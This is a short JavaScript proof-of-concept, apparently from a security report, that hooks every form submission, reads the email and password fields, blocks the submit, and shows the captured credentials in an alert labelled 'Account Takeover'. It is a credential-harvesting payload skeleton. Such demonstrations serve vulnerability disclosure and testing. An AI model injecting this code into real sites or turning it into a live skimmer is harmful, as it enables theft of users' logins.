document.addEventListener('submit', function(event) {
    const form = event.target;
    const emailField = form.querySelector('input[type="text"], input[type="email"]');
    const passwordField = form.querySelector('input[type="password"]');

    if (emailField && passwordField) {
        event.preventDefault();
        alert('PoC: Account Takeover\n\nEmail: ' + emailField.value + '\nPassword: ' + passwordField.value);
    }
});
